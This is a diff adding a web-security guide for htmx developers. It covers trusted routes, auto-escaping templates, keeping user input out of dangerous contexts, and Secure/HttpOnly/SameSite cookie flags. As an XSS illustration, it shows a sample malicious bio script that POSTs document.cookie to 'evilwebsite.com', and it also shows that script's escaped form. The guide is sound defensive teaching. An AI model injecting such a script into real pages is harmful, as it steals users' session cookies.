@@ -1,0 +1,436 @@
+<style> pre.sourceCode, code { background-color: lightgray }</style>
+<h1 id="web-security-basics-with-htmx">Web Security Basics with
+htmx</h1>
+<p>As htmx has gotten more popular, it has begun to reach communities
+who have never written server-generated HTML directly before. While
+writing dynamic HTML on the server is common for many frameworks, like
+Rails, Django, and Spring, and those communities have well-documented
+template engines. But it is a novel concept for people who are used to
+JS frameworks like React, Vue, and Svelte, where JSX is bundled in, so
+they’re never writing HTML at all.</p>
+<p>But have no fear! Writing secure htmx applications requires a
+slightly different approach to security, but it’s no harder than
+securing a JSX-based application. And because htmx is a very small
+addition to the browser’s hypermedia controls, it allows you to take
+advantage of the browser’s great built-in security features in ways that
+are harder to when your application requires a lot of JavaScript.</p>
+<h2 id="the-golden-rules">The Golden Rules</h2>
+<p>Follow these four simple rules, and you’ll be following the client
+security best practices:</p>
+<ol type="1">
+<li>Only use htmx to call routes that you control</li>
+<li>Always render your responses with an auto-escaping template
+engine</li>
+<li>Only put user input inside HTML tags</li>
+<li>If you have authentication cookies, set them with
+<code>SameSite=lax</code>, <code>HttpOnly</code>, and
+<code>Secure</code></li>
+</ol>
+<p>In the following section, I’ll discuss what each of these rules does,
+and what kinds of attack they protect against. For the vast majority of
+htmx users—those using htmx to build a website that allows users to
+login, view some data, and update that data—you should never have any
+reason to break them.</p>
+<p>Later on I will discuss how to break some of these rules, if your
+use-case requires it, but then you’ll be doing so with the full
+knowledge that you’re increasing the conceptual burden of securing your
+application. And you’ll have learned a lot about web security in the
+process.</p>
+<h2 id="understanding-the-rules">Understanding the Rules</h2>
+<h3 id="only-use-trusted-routes">Only use trusted routes</h3>
+<p>This is the most basic one, and the most important: <strong>do not
+call untrusted routes with htmx.</strong></p>
+<p>In practice, this means you should only use relative URLs. This is
+fine:</p>
+<div class="sourceCode" id="cb1"><pre
+class="sourceCode html"><code class="sourceCode html"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">button</span><span class="ot"> hx-get</span><span class="op">=</span><span class="st">&quot;/events&quot;</span><span class="dt">&gt;</span>Search events<span class="dt">&lt;/</span><span class="kw">button</span><span class="dt">&gt;</span></span></code></pre></div>
+<p>But this is not:</p>
+<div class="sourceCode" id="cb2"><pre
+class="sourceCode html"><code class="sourceCode html"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">button</span><span class="ot"> hx-get</span><span class="op">=</span><span class="st">&quot;https://google.com/search?q=events&quot;</span><span class="dt">&gt;</span>Search events<span class="dt">&lt;/</span><span class="kw">button</span><span class="dt">&gt;</span></span></code></pre></div>
+<p>The reason for this is simple: htmx inserts the response from that
+route directly into the user’s page. So if the response has a malicious
+<code>&lt;script&gt;</code> inside it, that script can steal the user’s
+data. If you don’t control the route, you cannot guarantee that whoever
+does control the route won’t add a malicious script.</p>
+<p>Fortunately, this is a very easy rule to follow. Hypermedia responses
+(i.e. HTML) are <a
+href="https://htmx.org/essays/hypermedia-apis-vs-data-apis/">specific to
+the layout of your application</a>, so there is almost never any reason
+you’d <em>want</em> to insert someone else’s HTML into your page.</p>
+<p>HTML is code; never execute untrusted code.</p>
+<h3 id="always-use-an-auto-escaping-template-engine">Always use an
+auto-escaping template engine</h3>
+<p>When you send HTML to the user, all dynamic content must be escaped.
+Use a template engine to construct your responses, and make sure that
+auto-escaping is on.</p>
+<p>Fortunately, all template engines support escaping HTML, and most of
+them enable it by default (Jinja is a notable exception). Below are just
+a few examples.</p>
+<table>
+<thead>
+<tr class="header">
+<th>Language</th>
+<th>Template Engine</th>
+<th>Escapes HTML by default?</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>JavaScript</td>
+<td>Nunjucks</td>
+<td>Yes</td>
+</tr>
+<tr class="even">
+<td>JavaScript</td>
+<td>EJS</td>
+<td>Yes, with <code>&lt;%= %&gt;</code></td>
+</tr>
+<tr class="odd">
+<td>JavaScript</td>
+<td>Handlebars</td>
+<td>Yes, with <code>{{ }}</code></td>
+</tr>
+<tr class="even">
+<td>Python</td>
+<td>Jinja</td>
+<td><strong>No</strong></td>
+</tr>
+<tr class="odd">
+<td>PHP</td>
+<td>Blade</td>
+<td>Yes</td>
+</tr>
+<tr class="even">
+<td>Go</td>
+<td>html/template</td>
+<td>Yes</td>
+</tr>
+<tr class="odd">
+<td>Java</td>
+<td>Thymeleaf</td>
+<td>Yes</td>
+</tr>
+<tr class="even">
+<td>Rust</td>
+<td>Tera</td>
+<td>Yes</td>
+</tr>
+</tbody>
+</table>
+<p>The kind of vulnerability this prevents is often called a Cross-Site
+Scripting (XSS) attack, a term that is <a
+href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#introduction">broadly
+used</a> to mean the injection of any unexpected content into your
+webpage. Typically, they store malicious code in your database so that
+you’ll serve it to your other users.</p>
+<p>Let’s say you’re building a dating site, and it lets users share a
+little bio about themselves. You’d render that bio like this, with
+<code>{{ user.bio }}</code> being the bio stored in the database:</p>
+<div class="sourceCode" id="cb3"><pre
+class="sourceCode html"><code class="sourceCode html"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">p</span><span class="ot"> class</span><span class="op">=</span><span class="st">bio</span><span class="dt">&gt;</span></span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a>{{ user.bio }}</span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;/</span><span class="kw">p</span><span class="dt">&gt;</span></span></code></pre></div>
+<p>If a malicious user wrote a bio with a script element in it—like one
+that sends the client’s cookie to another website—then this HTML will
+get sent to every user who views that bio:</p>
+<div class="sourceCode" id="cb4"><pre
+class="sourceCode html"><code class="sourceCode html"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">p</span><span class="ot"> class</span><span class="op">=</span><span class="st">bio</span><span class="dt">&gt;</span></span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">script</span><span class="dt">&gt;</span></span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a>    <span class="fu">fetch</span>(<span class="st">&#39;evilwebsite.com&#39;</span><span class="op">,</span> { <span class="dt">method</span><span class="op">:</span> <span class="st">&#39;POST&#39;</span><span class="op">,</span> <span class="dt">body</span><span class="op">:</span> <span class="bu">document</span><span class="op">.</span><span class="at">cookie</span> })</span>
+<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;/</span><span class="kw">script</span><span class="dt">&gt;</span></span>
+<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;/</span><span class="kw">p</span><span class="dt">&gt;</span></span></code></pre></div>
+<p>Fortunately this one is so easy to fix that you can write the code
+yourself. Whenever you insert untrusted (i.e. user-provided) data, you
+just have to replace eight characters with their non-code equivalents.
+This is an example using JavaScript:</p>
+<div class="sourceCode" id="cb5"><pre class="sourceCode js"><code class="sourceCode javascript"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="co">/**</span></span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a><span class="co"> * Replace any characters that could be used to inject a malicious script in an HTML context.</span></span>
+<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a><span class="co"> */</span></span>
+<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a><span class="im">export</span> <span class="kw">function</span> <span class="fu">escapeHtmlText</span> (value) {</span>
+<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a>  <span class="kw">const</span> stringValue <span class="op">=</span> value<span class="op">.</span><span class="fu">toString</span>()</span>
+<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a>  <span class="kw">const</span> entityMap <span class="op">=</span> {</span>
+<span id="cb5-7"><a href="#cb5-7" aria-hidden="true" tabindex="-1"></a>    <span class="st">&#39;&amp;&#39;</span><span class="op">:</span> <span class="st">&#39;&amp;amp;&#39;</span><span class="op">,</span></span>
+<span id="cb5-8"><a href="#cb5-8" aria-hidden="true" tabindex="-1"></a>    <span class="st">&#39;&lt;&#39;</span><span class="op">:</span> <span class="st">&#39;&amp;lt;&#39;</span><span class="op">,</span></span>
+<span id="cb5-9"><a href="#cb5-9" aria-hidden="true" tabindex="-1"></a>    <span class="st">&#39;&gt;&#39;</span><span class="op">:</span> <span class="st">&#39;&amp;gt;&#39;</span><span class="op">,</span></span>
+<span id="cb5-10"><a href="#cb5-10" aria-hidden="true" tabindex="-1"></a>    <span class="st">&#39;&quot;&#39;</span><span class="op">:</span> <span class="st">&#39;&amp;quot;&#39;</span><span class="op">,</span></span>
+<span id="cb5-11"><a href="#cb5-11" aria-hidden="true" tabindex="-1"></a>    <span class="st">&quot;&#39;&quot;</span><span class="op">:</span> <span class="st">&#39;&amp;#x27;&#39;</span><span class="op">,</span></span>
+<span id="cb5-12"><a href="#cb5-12" aria-hidden="true" tabindex="-1"></a>    <span class="st">&#39;/&#39;</span><span class="op">:</span> <span class="st">&#39;&amp;#x2F;&#39;</span><span class="op">,</span></span>
+<span id="cb5-13"><a href="#cb5-13" aria-hidden="true" tabindex="-1"></a>    <span class="st">&#39;`&#39;</span><span class="op">:</span> <span class="st">&#39;&amp;grave;&#39;</span><span class="op">,</span></span>
+<span id="cb5-14"><a href="#cb5-14" aria-hidden="true" tabindex="-1"></a>    <span class="st">&#39;=&#39;</span><span class="op">:</span> <span class="st">&#39;&amp;#x3D;&#39;</span></span>
+<span id="cb5-15"><a href="#cb5-15" aria-hidden="true" tabindex="-1"></a>  }</span>
+<span id="cb5-16"><a href="#cb5-16" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-17"><a href="#cb5-17" aria-hidden="true" tabindex="-1"></a>  <span class="co">// Match any of the characters inside /[ ... ]/</span></span>
+<span id="cb5-18"><a href="#cb5-18" aria-hidden="true" tabindex="-1"></a>  <span class="kw">const</span> regex <span class="op">=</span> <span class="ss">/</span><span class="sc">[&amp;&lt;&gt;&quot;&#39;`=/]</span><span class="ss">/g</span></span>
+<span id="cb5-19"><a href="#cb5-19" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> stringValue<span class="op">.</span><span class="fu">replace</span>(regex<span class="op">,</span> match <span class="kw">=&gt;</span> entityMap[match])</span>
+<span id="cb5-20"><a href="#cb5-20" aria-hidden="true" tabindex="-1"></a>}</span></code></pre></div>
+<p>This tiny JS function replaces <code>&lt;</code> with
+<code>&amp;lt;</code>, <code>"</code> with <code>&amp;quot;</code>, and
+so on. These characters will still render properly as <code>&lt;</code>
+and <code>"</code> when they’re used in the text, but can’t be
+interpreted as code constructs. The previous malicious bio will now be
+converted into the following HTML:</p>
+<div class="sourceCode" id="cb6"><pre
+class="sourceCode html"><code class="sourceCode html"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">p</span><span class="ot"> class</span><span class="op">=</span><span class="st">bio</span><span class="dt">&gt;</span></span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a><span class="dv">&amp;lt;</span>script<span class="dv">&amp;gt;</span>fetch(<span class="dv">&amp;#x27;</span>evilwebsite.com<span class="dv">&amp;#x27;</span>, { method: <span class="dv">&amp;#x27;</span>POST<span class="dv">&amp;#x27;</span>, data: document.cookie })<span class="dv">&amp;lt;</span>/script<span class="dv">&amp;gt;</span></span>
+<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;/</span><span class="kw">p</span><span class="dt">&gt;</span></span></code></pre></div>
+<p>Which does not execute any script at all.</p>
+<p>Fortunately, as established above, you don’t have to do your escaping
+manually—I just wanted to demonstrate how simple these concepts are.
+Every template engine has an auto-escaping feature, and you’re going to
+want to use a template engine anyway. Just make sure that escaping is
+enabled, and send all your HTML through it.</p>
+<h3 id="only-put-user-input-inside-html-tags">Only put user input inside
+HTML tags</h3>
+<p>This is an extension of the previous one, but it’s important enough
+to call out on its own. Do not allow your users to define arbitrary CSS
+or JS, even with your template engine.</p>
+<div class="sourceCode" id="cb7"><pre
+class="sourceCode html"><code class="sourceCode html"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="co">&lt;!-- Don&#39;t include inside script tags --&gt;</span></span>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">script</span><span class="dt">&gt;</span> </span>
+<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a>  <span class="kw">const</span> user <span class="op">=</span> {{ user<span class="op">.</span><span class="at">id</span> }} </span>
+<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;/</span><span class="kw">script</span><span class="dt">&gt;</span></span>
+<span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a> </span>
+<span id="cb7-6"><a href="#cb7-6" aria-hidden="true" tabindex="-1"></a><span class="co">&lt;!-- Don&#39;t include inside CSS tags --&gt;</span></span>
+<span id="cb7-7"><a href="#cb7-7" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">style</span><span class="dt">&gt;</span></span>
+<span id="cb7-8"><a href="#cb7-8" aria-hidden="true" tabindex="-1"></a>  h1 { <span class="kw">color</span>: {{ user.favorite_color }} }</span>
+<span id="cb7-9"><a href="#cb7-9" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;/</span><span class="kw">style</span><span class="dt">&gt;</span></span></code></pre></div>
+<p>And, don’t use it to define attributes or tag names either:</p>
+<div class="sourceCode" id="cb8"><pre
+class="sourceCode html"><code class="sourceCode html"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="co">&lt;!-- Don&#39;t allow user-defined tag names --&gt;</span></span>
+<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a><span class="er">&lt;</span>{{user.tag}}&gt;<span class="er">&lt;</span>/{{user.tag}}&gt;</span>
+<span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb8-4"><a href="#cb8-4" aria-hidden="true" tabindex="-1"></a><span class="co">&lt;!-- Don&#39;t allow user-defined attributes --&gt;</span></span>
+<span id="cb8-5"><a href="#cb8-5" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">a</span><span class="ot"> </span><span class="er">{{</span><span class="ot"> user.attribute </span><span class="er">}}</span><span class="dt">&gt;&lt;/</span><span class="kw">a</span><span class="dt">&gt;</span></span>
+<span id="cb8-6"><a href="#cb8-6" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">a</span><span class="ot"> class</span><span class="op">=</span><span class="st">&quot;{{ user.class }}&quot;</span><span class="dt">&gt;&lt;/</span><span class="kw">a</span><span class="dt">&gt;</span></span>
+<span id="cb8-7"><a href="#cb8-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb8-8"><a href="#cb8-8" aria-hidden="true" tabindex="-1"></a><span class="co">&lt;!-- Always use the variables inside tags (this is fine) --&gt;</span></span>
+<span id="cb8-9"><a href="#cb8-9" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">a</span><span class="dt">&gt;</span>{{ user.name }}<span class="dt">&lt;/</span><span class="kw">a</span><span class="dt">&gt;</span></span></code></pre></div>
+<p>CSS, JavaScript, and HTML attributes are <a
+href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#dangerous-contexts">“dangerous
+contexts”</a>, places where it’s not safe to allow arbitrary user input,
+even if it’s escaped. Escaping will protect you from some
+vulnerabilities here, but not all of them.</p>
+<p>Inserting user-generated text directly into a script tag should never
+be necessary. There <em>are</em> some situations where you might let
+users customize their CSS or customize HTML attributes, and handling
+those properly will be discussed down below.</p>
+<h2 id="secure-your-cookies">Secure your cookies</h2>
+<p>The best way to do authentication with htmx is using cookies. And
+because htmx encourages interactivity primarily through first-party HTML
+APIs, it’s usually trivial to enable the browser’s best cookie security
+features. These three in particular:</p>
+<ul>
+<li><code>Secure</code> - only send the cookie via HTTPS, never
+HTTP</li>
+<li><code>HttpOnly</code> - don’t make the cookie available to
+JavaScript via <code>document.cookie</code></li>
+<li><code>SameSite=Lax</code> - don’t allow other sites to use your
+cookie to make requests, unless it’s just a plain link</li>
+</ul>
+<p>To understand what these protect you against, let’s go over the
+basics. If you come from JavaScript SPAs, where it’s common to
+authenticate using the <code>Authorization</code> header, you might not
+be familiar with how cookies work. Fortunately they’re very simple.
+(Please note: this is not an “authentication with htmx” tutorial, just
+an overview of cookie tokens generally)</p>
+<p>If your users log in with something like a username and password
+<code>&lt;form&gt;</code>, their browser will send your server an HTTP
+request, and the server will send back a response that looks something
+like this</p>
+<pre class="http"><code>HTTP/2.0 200 OK
+Content-Type: text/html
+Set-Cookie: token=asd8234nsdfp982
+
+[HTML content]</code></pre>
+<p>You can also set options on that cookie, like the ones I recommended
+above. How to do this differs depending on the programming language, but
+the outcome is always an HTTP request that looks like this:</p>
+<pre class="http"><code>HTTP/2.0 200 OK
+Content-Type: text/html
+Set-Cookie: token=asd8234nsdfp982; Secure; HttpOnly; SameSite=Lax
+
+[HTML content]</code></pre>
+<p>That token corresponds to the user’s current login session. From now
+on, every time that user makes a request to any route at
+<code>yourdomain.com</code>, the browser will include that cookie from
+<code>Set-Cookie</code> in the HTTP request.</p>
+<pre class="http"><code>GET /users HTTP/1.1
+Host: yourdomain.com
+Cookie: token=asd8234nsdfp982</code></pre>
+<p>Your server needs to parse out that token and determine if it’s
+valid. Simple enough. So what do the options do?</p>
+<p>The first one, <code>Secure</code>, is the easiest to explain. It
+means that the browser will not send the cookie over an insecure HTTP
+connection, only a secure HTTPS connection. Sensitive info, like a
+user’s login token, should <em>never</em> be sent over an insecure
+connection.</p>
+<p>The second option, <code>HttpOnly</code>, is also straightforward. It
+means that the browser will not expose to the cookie to JavaScript,
+ever. So even if someone is able to insert a malicious script into
+another user’s browser, like in the <code>evilwebsite.com</code> example
+above, that malicious script cannot send the cookie to
+<code>evilwebsite.com</code>. The browser will only attach the cookie
+when the request is made to the website the cookie came from.</p>
+<p>Finally, <code>SameSite=Lax</code> locks down an avenue for
+Cross-Site Request Forgery (CSRF) attacks, which is where an attacker
+tries to get the client’s browser to make a malicious request to the
+<code>yourdomain.com</code> server—like a POST request. The
+<code>SameSite=Lax</code> setting tells the browser not to send the
+<code>yourdomain.com</code> cookie if the site that made the request
+isn’t <code>yourdomain.com</code>—unless it’s a straightforward
+<code>&lt;a&gt;</code> link navigating to your page. This is
+<em>mostly</em> browser default behavior now, but it’s important to
+still set it directly.</p>
+<p><strong>Important Note:</strong> <code>SameSite=Lax</code> only
+protects you at the domain level, not the subdomain level
+(i.e. <code>mysite.com</code>, not <code>mysite.github.io</code>). If
+you’re doing user login, you should always be doing that at your own
+domain in production. Sometimes the <a
+href="https://security.stackexchange.com/questions/223473/for-samesite-cookie-with-subdomains-what-are-considered-the-same-site">Public
+Suffixes List will protect you</a>, but you shouldn’t rely on that.</p>
+<h2 id="breaking-the-rules">Breaking the Rules</h2>
+<p>While reading this, you might have realized that certain things are
+hard to do using the security parameters described. We started with the
+easiest, most secure practices—that way mistakes lead to a broken UX,
+which can be fixed, rather than stolen data, which cannot.</p>
+<p>If you’re feeling confident about the basics, then there are times
+where you need to write more complicated functionality, and thus
+implement more complicated security mechanisms. This increases the
+conceptual burden of securing your application! You should only do it if
+that functionality is completely necessary, and cannot be implemented
+through alternative means.</p>
+<h3 id="calling-untrusted-apis">Calling untrusted APIs</h3>
+<p>Calling untrusted HTML APIs is lunacy. Never do this.</p>
+<p>There are cases where might want to call someone else’s JSON API from
+the client, and that’s fine, because JSON cannot execute arbitrary
+scripts. In that case, you’ll probably want to do something with that
+data to turn it into HTML. Don’t use htmx to do that—use
+<code>fetch</code> and <code>JSON.parse</code>; if the untrusted API
+pulls a fast one and returns HTML instead of JSON,
+<code>JSON.parse</code> will just fail harmlessly.</p>
+<p>Keep in mind that the JSON you parse might have a <em>property</em>
+that is formatted as HTML, so you have to be careful to insert that
+properly.</p>
+<div class="sourceCode" id="cb12"><pre
+class="sourceCode json"><code class="sourceCode json"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="fu">{</span> <span class="dt">&quot;name&quot;</span><span class="fu">:</span> <span class="st">&quot;&lt;script&gt;alert(&#39;Hahaha I&#39;m a script&#39;)&lt;/script&gt;}</span></span></code></pre></div>
+<p>So don’t insert the result of a JSON parse as HTML either—use
+<code>innerText</code> if you’re doing something like that. This is well
+outside the realm of htmx-controlled UI though.</p>
+<p>The 2.0 version of htmx will include an <code>innerText</code> swap,
+if you want to call someone else’s API directly from the client and just
+put that text into the page. ### Custom HTML controls</p>
+<p>Unlike calling untrusted HTML routes, there are a lot of good reason
+to let users do dynamic HTML-formatted content.</p>
+<p>What if, say, you want to let users link to an image?</p>
+<div class="sourceCode" id="cb13"><pre
+class="sourceCode html"><code class="sourceCode html"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">img</span><span class="ot"> src</span><span class="op">=</span><span class="st">&quot;{{ user.fav_img }}&quot;</span><span class="dt">&gt;</span></span></code></pre></div>
+<p>Or link to their personal website?</p>
+<div class="sourceCode" id="cb14"><pre
+class="sourceCode html"><code class="sourceCode html"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">a</span><span class="ot"> href</span><span class="op">=</span><span class="st">&quot;{{ user.fav_link }}&quot;</span><span class="dt">&gt;</span></span></code></pre></div>
+<p>The first thing to note is that if you want to include arbitrary
+attribute values, then always put the attributes inside quotes (most
+people do this anyway).</p>
+<p>If you took my advice above, the default “escape everything” approach
+also escapes forward slashes, so it will bork user-submitted URLs (like
+the above <code>fav_img</code> example).</p>
+<p>You can fix this in a couple of ways. First, you can upload the image
+to your own server (or S3 bucket, or the like), generate the link
+yourself, and then include it, unescaped. In nunjucks, you’d do it like
+this:</p>
+<div class="sourceCode" id="cb15"><pre
+class="sourceCode html"><code class="sourceCode html"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">img</span><span class="ot"> src</span><span class="op">=</span><span class="st">&quot;{{ user.fav_img | safe }}&quot;</span><span class="dt">&gt;</span></span></code></pre></div>
+<p>Yes, you’re including unescaped content, but it’s a link that you
+generated, so you know it’s safe.</p>
+<p>You can handle custom CSS in the same way. Rather than let your users
+specific the color directly, give them some limited choices, and set the
+choices based on their input.</p>
+<div class="sourceCode" id="cb16"><pre
+class="sourceCode css"><code class="sourceCode css"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a>{% if user<span class="fu">.favorite_color</span> === &#39;red&#39; %}</span>
+<span id="cb16-2"><a href="#cb16-2" aria-hidden="true" tabindex="-1"></a>h1 { <span class="kw">color</span>: <span class="st">&#39;red&#39;</span><span class="op">;</span> }</span>
+<span id="cb16-3"><a href="#cb16-3" aria-hidden="true" tabindex="-1"></a>{% else %}</span>
+<span id="cb16-4"><a href="#cb16-4" aria-hidden="true" tabindex="-1"></a>h1 { <span class="kw">color</span>: <span class="st">&#39;blue&#39;</span><span class="op">;</span> }</span>
+<span id="cb16-5"><a href="#cb16-5" aria-hidden="true" tabindex="-1"></a>{% endif %}</span></code></pre></div>
+<p>In that example, the user can set <code>favorite_color</code> to
+whatever they like, but it’s never going to be anything but red or
+blue.</p>
+<p>If you want to let users link to arbitrary websites or images, that’s
+more complicated. You can write a custom escaping function that escapes
+everything <em>but</em> forward slashes, so the link will work
+properly.</p>
+<p>But even if you do that correctly, you are introducing some new
+security challenges. That image link can be used to track your users,
+since your users will directly request it from someone else’s server.
+Maybe you’re fine with that, maybe you include other mitigations. The
+important part is that you are aware that introducing this level of
+customization comes with a more difficult security model, and if you
+don’t have the bandwidth to research and test it, you shouldn’t do
+it.</p>
+<h3 id="non-cookie-authentication">Non-cookie authentication</h3>
+<p>JavaScript SPAs sometimes authenticate by saving a token in the
+user’s local storage, and then adding that to the
+<code>Authorization</code> header of each request. Unfortunately,
+there’s no way to set the <code>Authroization</code> header without
+using JavaScript, which not as secure; if it’s available to your trusted
+JavaScript, it’s available to attackers if they manage to get a
+malicious script onto your page. Instead, use a cookie (with the above
+attributes), which can be set and secured without touching JavaScript at
+all.</p>
+<p>Why is there an <code>Authorization</code> header but no way to set
+it with HTML controls? Well, that’s just one of WHATWG’s <del>outrageous
+omissions</del> little mysteries.</p>
+<p>You might need to use an <code>Authorization</code> header if you’re
+authenticating the user’s client to an API route that you don’t control,
+in which case the regular precautions about routes you don’t control
+apply. ## That’s all?</p>
+<p>No, of course not. Writing secure web applications is hard. But those
+are the web security basics that you might not have known coming from
+Single-Page Applications. Even if you intend to keep writing SPAs,
+they’re good to know.</p>
+<p>This guide is written with the presumption that you know other web
+development basics that <em>would</em> be required to write an SPA, or
+any web application. For instance, you should know not to create
+<code>GET</code> routes that can alter the backend state; if you don’t
+know that, <code>SameSite=Lax</code> isn’t going to protect you. We make
+these simplifying assumptions in order to target the widest possible
+audience without including distracting information that they already
+know, but obviously this can’t catch everyone. If you feel there’s an
+obvious thing we should have mentioned, please reach out and we’ll
+update it. We feel very strongly about getting security education
+right.</p>
+<p>This guide also assumes that you’re not doing anything super fancy,
+like running a website that hosts other people’s websites. If you’re
+doing anything like that, the security concepts you need to be aware of
+far exceed the scope of this guide.</p>
+<h2 id="is-this-a-step-back">Is this a step back?</h2>
+<p>You might reasonably wonder: if I didn’t have to know these things
+when I was building SPAs, isn’t htmx a step back in security? We would
+challenge the first part of that statement.</p>
+<p>You need to know about XSS attacks if you’re putting dynamic content
+on the web, period. A developer who doesn’t understand how XSS works
+won’t understand what’s dangerous about using React’s
+<code>dangerouslySetInnerHTML</code>—and they’ll go ahead and set it the
+first time they need to render rich user-generated text. It is the
+library’s responsibility to make those security basics as easy to find
+as possible; it has always been the developer’s responsibility to know
+and follow them.</p>
+<p>This article is organized to making securing your htmx application a
+“pit of success”—follow these simple rules and you won’t code an XSS
+vulnerability. But it’s impossible to write a library that’s going to be
+secure in the hands of a developer who refuses to learn
+<em>anything</em> about security, because security is about controlling
+access to information, and it will always be the human’s job to explain
+to the computer precisely who has access to what information.</p>
+<p>Again, writing secure web applications is <em>hard</em>. There are
+plenty of easy pitfalls related to routing, or database access, or HTML
+templating, or business logic. And yet, if security is only the domain
+of security experts, then only security experts should be making web
+applications. Maybe you believe that should be the case! But if they’re
+security experts, they definitely know how to correctly use a template
+engine, so htmx will be no trouble for them.</p>
+<p>For everyone else:</p>
+<ul>
+<li>Don’t call untrusted routes</li>
+<li>Use a template engine</li>
+<li>Only put user input inside HTML tags</li>
+<li>Secure your cookies</li>
+</ul>
